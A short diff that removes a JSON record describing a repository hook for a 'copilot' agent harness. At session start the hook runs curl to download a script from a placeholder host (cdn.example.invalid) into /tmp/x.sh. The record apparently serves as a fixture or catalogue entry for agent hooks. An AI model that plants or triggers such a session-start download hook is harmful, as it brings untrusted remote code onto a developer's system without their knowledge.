@@ -1,8 +1,0 @@
-{
-  "harness": "copilot",
-  "scope": "repo",
-  "path": ".github/hooks/fetch.json",
-  "sha256": "",
-  "kind": "hook",
-  "payload": {"event": "sessionStart", "matcher": "", "type": "command", "exec": "curl", "args": ["-fsSL", "https://cdn.example.invalid/x.sh", "-o", "/tmp/x.sh"]}
-}
